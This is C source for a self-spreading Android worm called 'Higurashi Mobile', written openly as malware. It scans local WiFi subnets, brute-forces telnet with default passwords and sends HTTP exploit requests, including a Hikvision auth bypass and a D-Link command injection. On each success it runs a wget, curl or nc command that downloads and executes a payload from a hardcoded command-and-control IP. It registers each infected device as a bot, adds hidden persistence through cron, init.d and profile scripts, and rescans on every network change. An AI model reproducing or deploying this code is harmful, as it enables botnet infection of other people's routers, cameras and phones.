// higurashi_mobile.c - Android WiFi Worm with Auto-Replication
// Compile: $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android21-clang -o higurashi_mobile higurashi_mobile.c -static -lpthread

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/types.h>
#include <dirent.h>

// Configuration
#define C2_HOST "93.95.231.134"
#define C2_PORT 4444
#define HTTP_PORT 8080
#define SCAN_THREADS 20
#define MAX_PEERS 50

// P2P peer tracking
typedef struct {
    char ip[16];
    int port;
    time_t last_seen;
} Peer;

Peer peer_list[MAX_PEERS];
int peer_count = 0;
pthread_mutex_t peer_mutex = PTHREAD_MUTEX_INITIALIZER;

char bot_id[32];
char current_network[64] = "";
char my_ip[16];
int sock_c2 = -1;

// ============================================================================
// NETWORK UTILITIES
// ============================================================================

// Get current WiFi network SSID (Android-specific)
int get_current_wifi_ssid(char *ssid, size_t len) {
    FILE *fp = popen("getprop wifi.interface 2>/dev/null || echo wlan0", "r");
    if (!fp) return -1;
    
    char iface[32];
    fgets(iface, sizeof(iface), fp);
    pclose(fp);
    iface[strcspn(iface, "\n")] = 0;
    
    // Try to get SSID from wpa_supplicant
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "wpa_cli -i %s status 2>/dev/null | grep ^ssid= | cut -d= -f2", iface);
    
    fp = popen(cmd, "r");
    if (!fp) {
        // Fallback: use IP range as network identifier
        snprintf(ssid, len, "network_%s", my_ip);
        return 0;
    }
    
    if (fgets(ssid, len, fp) == NULL) {
        pclose(fp);
        snprintf(ssid, len, "network_%s", my_ip);
        return 0;
    }
    
    ssid[strcspn(ssid, "\n")] = 0;
    pclose(fp);
    return 0;
}

// Get local IP address
void get_local_ip() {
    FILE *fp = popen("ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \\K\\S+' || echo 127.0.0.1", "r");
    if (fp) {
        fgets(my_ip, sizeof(my_ip), fp);
        my_ip[strcspn(my_ip, "\n")] = 0;
        pclose(fp);
    } else {
        strcpy(my_ip, "127.0.0.1");
    }
}

// Get gateway IP (router)
void get_gateway_ip(char *gateway) {
    FILE *fp = popen("ip route | grep default | awk '{print $3}' | head -1", "r");
    if (fp) {
        fgets(gateway, 16, fp);
        gateway[strcspn(gateway, "\n")] = 0;
        pclose(fp);
    } else {
        strcpy(gateway, "192.168.1.1");
    }
}

// Extract subnet from IP
void get_subnet(const char *ip, char *subnet) {
    strncpy(subnet, ip, 16);
    char *last_dot = strrchr(subnet, '.');
    if (last_dot) {
        *(last_dot + 1) = '0';
        *(last_dot + 2) = '\0';
    }
}

// ============================================================================
// P2P PEER MANAGEMENT
// ============================================================================

void add_peer(const char *ip, int port) {
    pthread_mutex_lock(&peer_mutex);
    
    // Check if peer already exists
    for (int i = 0; i < peer_count; i++) {
        if (strcmp(peer_list[i].ip, ip) == 0 && peer_list[i].port == port) {
            peer_list[i].last_seen = time(NULL);
            pthread_mutex_unlock(&peer_mutex);
            return;
        }
    }
    
    // Add new peer
    if (peer_count < MAX_PEERS) {
        strncpy(peer_list[peer_count].ip, ip, 16);
        peer_list[peer_count].port = port;
        peer_list[peer_count].last_seen = time(NULL);
        peer_count++;
    }
    
    pthread_mutex_unlock(&peer_mutex);
}

// Sync peer list with other bots
void sync_peers_with_bot(const char *bot_ip) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    
    struct timeval tv = {.tv_sec = 2, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, bot_ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        // Request peer list
        char req[64];
        snprintf(req, sizeof(req), "PEERS|%s\n", my_ip);
        send(sock, req, strlen(req), 0);
        
        // Receive peer list
        char response[2048];
        int n = recv(sock, response, sizeof(response) - 1, 0);
        if (n > 0) {
            response[n] = '\0';
            
            // Parse peer list: IP1:PORT1,IP2:PORT2,...
            char *token = strtok(response, ",");
            while (token) {
                char peer_ip[16];
                int peer_port;
                if (sscanf(token, "%15[^:]:%d", peer_ip, &peer_port) == 2) {
                    add_peer(peer_ip, peer_port);
                }
                token = strtok(NULL, ",");
            }
        }
    }
    
    close(sock);
}

// ============================================================================
// EXPLOIT & PAYLOAD DEPLOYMENT
// ============================================================================

int try_telnet_exploit(const char *ip, int port) {
    char *creds[][2] = {
        {"admin", "admin"}, {"root", "root"}, {"admin", ""},
        {"admin", "password"}, {"admin", "12345"}, {"888888", "888888"},
        {"666666", "666666"}, {"admin", "1234"}, {NULL, NULL}
    };
    
    for (int i = 0; creds[i][0] != NULL; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv = {.tv_sec = 3, .tv_usec = 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char buf[1024];
            recv(sock, buf, sizeof(buf), 0); // Banner
            
            // Try credentials
            snprintf(buf, sizeof(buf), "%s\n", creds[i][0]);
            send(sock, buf, strlen(buf), 0);
            usleep(200000);
            recv(sock, buf, sizeof(buf), 0);
            
            snprintf(buf, sizeof(buf), "%s\n", creds[i][1]);
            send(sock, buf, strlen(buf), 0);
            usleep(200000);
            int n = recv(sock, buf, sizeof(buf), 0);
            
            if (n > 0 && (strstr(buf, "#") || strstr(buf, "$") || strstr(buf, ">"))) {
                // Success! Deploy payload
                char deploy[512];
                snprintf(deploy, sizeof(deploy),
                    "cd /tmp;wget http://%s:%d/higurashi_mini -O h 2>/dev/null||"
                    "curl -o h http://%s:%d/higurashi_mini 2>/dev/null||"
                    "nc %s %d < /dev/null > h;"
                    "chmod 777 h;./h %s %d &\n",
                    C2_HOST, HTTP_PORT, C2_HOST, HTTP_PORT, C2_HOST, HTTP_PORT, C2_HOST, C2_PORT);
                
                send(sock, deploy, strlen(deploy), 0);
                close(sock);
                return 0; // Success
            }
        }
        close(sock);
    }
    
    return -1;
}

int try_http_exploit(const char *ip, int port) {
    // Try common CVE exploits via HTTP
    char *payloads[] = {
        // Hikvision CVE-2017-7921
        "GET /Security/users?auth=YWRtaW46MTEK HTTP/1.1\r\nHost: %s\r\n\r\n",
        // D-Link command injection
        "GET /cgi-bin/;cd /tmp;wget http://%s:%d/higurashi_mini -O h;chmod 777 h;./h& HTTP/1.1\r\nHost: %s\r\n\r\n",
        NULL
    };
    
    for (int i = 0; payloads[i] != NULL; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv = {.tv_sec = 3, .tv_usec = 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char request[1024];
            snprintf(request, sizeof(request), payloads[i], ip, ip, HTTP_PORT, ip);
            send(sock, request, strlen(request), 0);
            
            char response[2048];
            int n = recv(sock, response, sizeof(response), 0);
            if (n > 0 && (strstr(response, "200 OK") || strstr(response, "302"))) {
                close(sock);
                return 0; // Possible success
            }
        }
        close(sock);
    }
    
    return -1;
}

// ============================================================================
// NETWORK SCANNING
// ============================================================================

typedef struct {
    char subnet[16];
    int start;
    int end;
} ScanRange;

void *scan_worker(void *arg) {
    ScanRange *range = (ScanRange*)arg;
    char ip[32];
    
    for (int i = range->start; i <= range->end; i++) {
        snprintf(ip, sizeof(ip), "%s%d", range->subnet, i);
        
        // Skip our own IP
        if (strcmp(ip, my_ip) == 0) continue;
        
        // Quick ping check (skip if unresponsive)
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);
        
        struct timeval tv = {.tv_sec = 0, .tv_usec = 100000}; // 100ms timeout
        if (select(sock + 1, NULL, &writefds, NULL, &tv) > 0) {
            // Host is up, try exploits
            close(sock);
            
            // Try common ports
            if (try_telnet_exploit(ip, 23) == 0) continue;
            if (try_telnet_exploit(ip, 2323) == 0) continue;
            if (try_http_exploit(ip, 80) == 0) continue;
            if (try_http_exploit(ip, 8080) == 0) continue;
            
            // Add as potential peer
            add_peer(ip, C2_PORT);
        } else {
            close(sock);
        }
    }
    
    free(range);
    return NULL;
}

void scan_local_network() {
    char gateway[16];
    get_gateway_ip(gateway);
    
    char subnet[16];
    get_subnet(gateway, subnet);
    
    printf("[+] Scanning network: %s0/24\n", subnet);
    
    pthread_t threads[SCAN_THREADS];
    int ips_per_thread = 254 / SCAN_THREADS;
    
    for (int t = 0; t < SCAN_THREADS; t++) {
        ScanRange *range = malloc(sizeof(ScanRange));
        strcpy(range->subnet, subnet);
        range->start = t * ips_per_thread + 1;
        range->end = (t == SCAN_THREADS - 1) ? 254 : (t + 1) * ips_per_thread;
        
        pthread_create(&threads[t], NULL, scan_worker, range);
    }
    
    // Wait for all threads
    for (int t = 0; t < SCAN_THREADS; t++) {
        pthread_join(threads[t], NULL);
    }
    
    printf("[+] Scan complete. Found %d potential targets\n", peer_count);
}

// ============================================================================
// AUTO-REPLICATION ON WIFI CHANGE
// ============================================================================

void *wifi_monitor_thread(void *arg) {
    (void)arg;
    
    while (1) {
        char new_network[64];
        get_current_wifi_ssid(new_network, sizeof(new_network));
        get_local_ip();
        
        // Check if network changed
        if (strcmp(new_network, current_network) != 0) {
            printf("\n[!] WiFi CHANGED: %s -> %s\n", current_network, new_network);
            printf("[!] IP: %s\n", my_ip);
            strcpy(current_network, new_network);
            
            // Auto-scan new network
            printf("[*] Auto-scanning new network...\n");
            scan_local_network();
            
            // Try to reconnect to C2
            if (sock_c2 > 0) close(sock_c2);
            sock_c2 = -1;
        }
        
        sleep(30); // Check every 30 seconds
    }
    
    return NULL;
}

// ============================================================================
// C2 CONNECTION (Fallback to P2P if C2 down)
// ============================================================================

void connect_to_c2() {
    while (1) {
        sock_c2 = socket(AF_INET, SOCK_STREAM, 0);
        if (sock_c2 < 0) {
            sleep(10);
            continue;
        }
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &addr.sin_addr);
        
        printf("[*] Connecting to C2: %s:%d\n", C2_HOST, C2_PORT);
        
        if (connect(sock_c2, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            printf("[+] Connected to C2!\n");
            
            // Send registration
            char reg[128];
            snprintf(reg, sizeof(reg), "REGISTER|%s|%s|mobile\n", bot_id, my_ip);
            send(sock_c2, reg, strlen(reg), 0);
            
            // Keep-alive loop
            while (1) {
                char buf[1024];
                int n = recv(sock_c2, buf, sizeof(buf) - 1, 0);
                if (n <= 0) break;
                
                buf[n] = '\0';
                
                // Parse commands
                if (strncmp(buf, "SCAN", 4) == 0) {
                    scan_local_network();
                } else if (strncmp(buf, "PEERS", 5) == 0) {
                    // Send peer list
                    char response[2048] = "";
                    pthread_mutex_lock(&peer_mutex);
                    for (int i = 0; i < peer_count; i++) {
                        char peer[32];
                        snprintf(peer, sizeof(peer), "%s:%d,", peer_list[i].ip, peer_list[i].port);
                        strcat(response, peer);
                    }
                    pthread_mutex_unlock(&peer_mutex);
                    send(sock_c2, response, strlen(response), 0);
                }
                
                sleep(5);
            }
            
            printf("[-] Lost connection to C2\n");
            close(sock_c2);
        }
        
        // Failed to connect, try P2P fallback
        printf("[*] C2 unreachable, trying P2P mode...\n");
        
        // Try to connect to any known peer
        pthread_mutex_lock(&peer_mutex);
        for (int i = 0; i < peer_count; i++) {
            sync_peers_with_bot(peer_list[i].ip);
        }
        pthread_mutex_unlock(&peer_mutex);
        
        sleep(60);
    }
}

// ============================================================================
// PERSISTENCE
// ============================================================================

void add_persistence() {
    // Android-specific persistence
    char my_path[256];
    readlink("/proc/self/exe", my_path, sizeof(my_path) - 1);
    
    // Method 1: Copy to /data/local/tmp (writable on Android)
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cp %s /data/local/tmp/.system 2>/dev/null; chmod 755 /data/local/tmp/.system", my_path);
    system(cmd);
    
    // Method 2: Try to add to init.rc (requires root)
    snprintf(cmd, sizeof(cmd), 
        "echo 'service higurama /data/local/tmp/.system' >> /system/etc/init.d/99higurama 2>/dev/null");
    system(cmd);
    
    // Method 3: Cron if available
    snprintf(cmd, sizeof(cmd),
        "(crontab -l 2>/dev/null; echo '*/10 * * * * /data/local/tmp/.system') | crontab - 2>/dev/null");
    system(cmd);
    
    // Method 4: Profile scripts
    snprintf(cmd, sizeof(cmd),
        "echo '/data/local/tmp/.system &' >> /etc/profile 2>/dev/null");
    system(cmd);
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char **argv) {
    // Daemonize
    if (fork() > 0) exit(0);
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    // Generate bot ID
    srand(time(NULL) ^ getpid());
    snprintf(bot_id, sizeof(bot_id), "mob_%08x", rand());
    
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     HIGURASHI MOBILE - WiFi Auto-Replication Worm        ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("[*] Bot ID: %s\n", bot_id);
    
    // Get initial network info
    get_local_ip();
    get_current_wifi_ssid(current_network, sizeof(current_network));
    printf("[*] Current network: %s\n", current_network);
    printf("[*] Local IP: %s\n", my_ip);
    
    // Add persistence
    add_persistence();
    
    // Initial scan of current network
    printf("[*] Performing initial network scan...\n");
    scan_local_network();
    
    // Start WiFi monitor thread (auto-scans on network change)
    pthread_t wifi_thread;
    pthread_create(&wifi_thread, NULL, wifi_monitor_thread, NULL);
    
    // Connect to C2 (blocks here)
    connect_to_c2();
    
    return 0;
}
